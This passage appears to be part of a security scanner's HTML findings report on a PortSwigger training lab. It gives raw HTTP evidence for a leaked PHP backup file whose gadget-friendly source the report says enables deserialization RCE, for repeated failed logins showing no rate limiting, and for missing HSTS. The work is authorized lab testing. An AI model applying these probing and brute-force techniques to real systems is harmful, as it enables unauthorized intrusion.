+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Not solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;h4&gt;Internal Server Error&lt;/h4&gt;
+                    &lt;p class=is-warning&gt;PHP Fatal error:  Uncaught Exception: Invalid user administrator in /var/www/index.php:7
+Stack trace:
+#0 {main}
+  thrown in /var/www/index.php on line 7&lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr62xbz6-g</code> — <code>artifacts/s-0002/ev-mr62xbz6-g/</code></div><div class="lbl">REQUEST</div><pre>GET /my-account HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+content-length: 3407
+content-type: text/html; charset=utf-8
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labs.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a id='lab-link' class='button' href='/'&gt;Back to lab home&lt;/a&gt;
+                            &lt;button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'&gt;Submit solution&lt;/button&gt;
+                            &lt;script src='/resources/labheader/js/submitSolution.js'&gt;&lt;/script&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-notsolved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Not solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;h4&gt;Internal Server Error&lt;/h4&gt;
+                    &lt;p class=is-warning&gt;PHP Fatal error:  Uncaught Exception: Invalid user administrator in /var/www/index.php:7
+Stack trace:
+#0 {main}
+  thrown in /var/www/index.php on line 7&lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 3. [info-disclosure] PHP source code disclosure via editor backup (~) at /cgi-bin/libs/CustomTemplate.php~</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target https://0a14001003ba06e480069a13001b0048.web-security-academy.net/</div>
+<div class="desc">An editor/backup copy of a server-side PHP source file is served at /cgi-bin/libs/CustomTemplate.php~ (HTTP 200, Content-Type text/plain). It discloses the full source of the CustomTemplate, Product, Description and DefaultMap classes, including magic methods __wakeup and __get and a call_user_func($this-&gt;callback, $name) sink. This is exactly the information needed to construct a custom deserialization gadget chain against the serialization-based session mechanism, and directly enables the RCE finding. A non-existent sibling backup returns the app JSON 404, proving the leak is specific to the real file, not a catch-all.</div>
+<div><b>Reproduction</b></div><pre>GET /cgi-bin/libs/CustomTemplate.php~ -&gt; 200 text/plain; body starts &quot;&lt;?php class CustomTemplate {&quot; and reveals DefaultMap::__get -&gt; call_user_func($this-&gt;callback, $name). Negative control GET /cgi-bin/libs/NonExistent.php~ -&gt; 404 &quot;Not Found&quot;.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr656d6a-2d</code> — <code>artifacts/_/ev-mr656d6a-2d/</code></div><div class="lbl">REQUEST</div><pre>GET /cgi-bin/libs/NonExistent.php~ HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 11
+content-type: application/json; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&quot;Not Found&quot;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr64wpmk-2c</code> — <code>artifacts/_/ev-mr64wpmk-2c/</code></div><div class="lbl">REQUEST</div><pre>GET /cgi-bin/libs/CustomTemplate.php~ HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1396
+content-type: text/plain
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;?php
+
+class CustomTemplate {
+    private $default_desc_type;
+    private $desc;
+    public $product;
+
+    public function __construct($desc_type='HTML_DESC') {
+        $this-&gt;desc = new Description();
+        $this-&gt;default_desc_type = $desc_type;
+        // Carlos thought this is cool, having a function called in two places... What a genius
+        $this-&gt;build_product();
+    }
+
+    public function __sleep() {
+        return [&quot;default_desc_type&quot;, &quot;desc&quot;];
+    }
+
+    public function __wakeup() {
+        $this-&gt;build_product();
+    }
+
+    private function build_product() {
+        $this-&gt;product = new Product($this-&gt;default_desc_type, $this-&gt;desc);
+    }
+}
+
+class Product {
+    public $desc;
+
+    public function __construct($default_desc_type, $desc) {
+        $this-&gt;desc = $desc-&gt;$default_desc_type;
+    }
+}
+
+class Description {
+    public $HTML_DESC;
+    public $TEXT_DESC;
+
+    public function __construct() {
+        // @Carlos, what were you thinking with these descriptions? Please refactor!
+        $this-&gt;HTML_DESC = '&lt;p&gt;This product is &lt;blink&gt;SUPER&lt;/blink&gt; cool in html&lt;/p&gt;';
+        $this-&gt;TEXT_DESC = 'This product is cool in text';
+    }
+}
+
+class DefaultMap {
+    private $callback;
+
+    public function __construct($callback) {
+        $this-&gt;callback = $callback;
+    }
+
+    public function __get($name) {
+        return call_user_func($this-&gt;callback, $name);
+    }
+}
+
+?&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr656hg3-2e</code> — <code>artifacts/_/ev-mr656hg3-2e/</code></div><div class="lbl">REQUEST</div><pre>GET /cgi-bin/libs/CustomTemplate.php~ HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1396
+content-type: text/plain
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;?php
+
+class CustomTemplate {
+    private $default_desc_type;
+    private $desc;
+    public $product;
+
+    public function __construct($desc_type='HTML_DESC') {
+        $this-&gt;desc = new Description();
+        $this-&gt;default_desc_type = $desc_type;
+        // Carlos thought this is cool, having a function called in two places... What a genius
+        $this-&gt;build_product();
+    }
+
+    public function __sleep() {
+        return [&quot;default_desc_type&quot;, &quot;desc&quot;];
+    }
+
+    public function __wakeup() {
+        $this-&gt;build_product();
+    }
+
+    private function build_product() {
+        $this-&gt;product = new Product($this-&gt;default_desc_type, $this-&gt;desc);
+    }
+}
+
+class Product {
+    public $desc;
+
+    public function __construct($default_desc_type, $desc) {
+        $this-&gt;desc = $desc-&gt;$default_desc_type;
+    }
+}
+
+class Description {
+    public $HTML_DESC;
+    public $TEXT_DESC;
+
+    public function __construct() {
+        // @Carlos, what were you thinking with these descriptions? Please refactor!
+        $this-&gt;HTML_DESC = '&lt;p&gt;This product is &lt;blink&gt;SUPER&lt;/blink&gt; cool in html&lt;/p&gt;';
+        $this-&gt;TEXT_DESC = 'This product is cool in text';
+    }
+}
+
+class DefaultMap {
+    private $callback;
+
+    public function __construct($callback) {
+        $this-&gt;callback = $callback;
+    }
+
+    public function __get($name) {
+        return call_user_func($this-&gt;callback, $name);
+    }
+}
+
+?&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 4. [rate-limit] No brute-force protection / rate limiting on login</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target https://0a14001003ba06e480069a13001b0048.web-security-academy.net/</div>
+<div class="desc">POST /login enforces no rate limiting, account lockout, or CAPTCHA. Roughly a dozen consecutive failed login attempts for user `wiener` (and other usernames) were all processed and returned the normal 200 &quot;invalid credentials&quot; page — no 429, no temporary lockout, no CAPTCHA challenge ever appeared. The endpoint clearly differentiates outcomes (valid creds → 302 redirect with a session; invalid → 200 error page), so the sustained 200 responses across the failure burst represent genuinely processed attempts, not a catch-all. This permits unrestricted online password brute-forcing / credential stuffing against any known username. Severity is Low in isolation; it compounds the impact of any weak/guessable password.</div>
+<div><b>Reproduction</b></div><pre>1. Negative control (endpoint is not a catch-all): POST /login `username=wiener&amp;password=peter` → 302 + session cookie (ev-mr62ppf2-6).
+2. Send many rapid failed logins: POST /login `username=wiener&amp;password=bad1..bad6` (and earlier attempts) — every one returns 200, 4160-byte error page, no throttling (ev-mr639u9c-12, ev-mr63a2tk-14, among ~12 total).
+3. Observe: no 429/lockout/CAPTCHA after a dozen consecutive failures → brute-force protection absent.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr62ppf2-6</code> — <code>artifacts/s-0002/ev-mr62ppf2-6/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+username=wiener&amp;password=peter</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+content-length: 0
+location: /my-account?id=wiener
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr639u9c-12</code> — <code>artifacts/s-0002/ev-mr639u9c-12/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+username=wiener&amp;password=bad4</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 4160
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labs.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'&gt;Submit solution&lt;/button&gt;
+                            &lt;script src='/resources/labheader/js/submitSolution.js'&gt;&lt;/script&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-notsolved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Not solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                            &lt;a href=&quot;/my-account&quot;&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;h1&gt;Login&lt;/h1&gt;
+                    &lt;section&gt;
+                        &lt;p class=is-warning&gt;Invalid username or password.&lt;/p&gt;
+                        &lt;form class=login-form method=POST action=&quot;/login&quot;&gt;
+                            &lt;label&gt;Username&lt;/label&gt;
+                            &lt;input required type=username name=&quot;username&quot; autofocus&gt;
+                            &lt;label&gt;Password&lt;/label&gt;
+                            &lt;input required type=password name=&quot;password&quot;&gt;
+                            &lt;button class=button type=submit&gt; Log in &lt;/button&gt;
+                        &lt;/form&gt;
+                    &lt;/section&gt;
+                    &lt;!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated --&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr63a2tk-14</code> — <code>artifacts/s-0002/ev-mr63a2tk-14/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+username=wiener&amp;password=bad6</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 4160
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labs.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'&gt;Submit solution&lt;/button&gt;
+                            &lt;script src='/resources/labheader/js/submitSolution.js'&gt;&lt;/script&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-notsolved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Not solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                            &lt;a href=&quot;/my-account&quot;&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;h1&gt;Login&lt;/h1&gt;
+                    &lt;section&gt;
+                        &lt;p class=is-warning&gt;Invalid username or password.&lt;/p&gt;
+                        &lt;form class=login-form method=POST action=&quot;/login&quot;&gt;
+                            &lt;label&gt;Username&lt;/label&gt;
+                            &lt;input required type=username name=&quot;username&quot; autofocus&gt;
+                            &lt;label&gt;Password&lt;/label&gt;
+                            &lt;input required type=password name=&quot;password&quot;&gt;
+                            &lt;button class=button type=submit&gt; Log in &lt;/button&gt;
+                        &lt;/form&gt;
+                    &lt;/section&gt;
+                    &lt;!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated --&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 5. [burp] Strict transport security not enforced (2 URLs)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">(confidence: CERTAIN) [+1 more URL(s): https://0a14001003ba06e480069a13001b0048.web-security-academy.net/product] @ https://0a14001003ba06e480069a13001b0048.web-security-academy.net/login</div>
+<div><b>Reproduction</b></div><pre>Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr661nys-30</code> — <code>artifacts/_/ev-mr661nys-30/</code></div><div class="lbl">REQUEST</div><pre>GET /login HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+
+GET /login HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 6903
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labs.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
